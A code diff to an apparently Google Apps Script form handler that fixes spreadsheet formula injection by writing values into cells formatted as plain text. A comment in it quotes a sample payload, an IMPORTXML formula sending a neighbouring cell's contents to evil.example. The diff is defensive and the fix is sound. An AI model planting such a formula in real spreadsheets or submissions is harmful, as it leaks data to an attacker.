@@ -305,7 +305,6 @@ function appendRow_(sheet, data, submitted) {
   var row = [submitted];
   for (var i = 0; i < FIELDS.length; i++) {
     var v = data[FIELDS[i][0]];
-    // Force text so Sheets cannot reinterpret a value as a formula or date.
     row.push(v === null || v === undefined ? '' : String(v));
   }
 
@@ -313,7 +312,20 @@ function appendRow_(sheet, data, submitted) {
   var lock = LockService.getScriptLock();
   lock.waitLock(20000);
   try {
-    sheet.appendRow(row);
+    // ⚠️ Do NOT use appendRow() here. It parses what it writes, so a submitted
+    // value beginning with '=' is stored as a LIVE FORMULA rather than text —
+    // spreadsheet formula injection. Confirmed by test: a form field containing
+    // "=1+1" landed in the sheet as "2". A hostile submitter could therefore
+    // plant something like
+    //     =IMPORTXML("https://evil.example/?d="&B2, "//a")
+    // which runs when someone opens the sheet and leaks the neighbouring cell.
+    //
+    // Casting to String() does NOT prevent this; it only sets the JavaScript
+    // type. The defence is formatting the destination cells as plain text ('@')
+    // BEFORE writing, so Sheets stores the characters literally.
+    var target = sheet.getRange(sheet.getLastRow() + 1, 1, 1, row.length);
+    target.setNumberFormat('@');
+    target.setValues([row]);
   } finally {
     lock.releaseLock();
   }
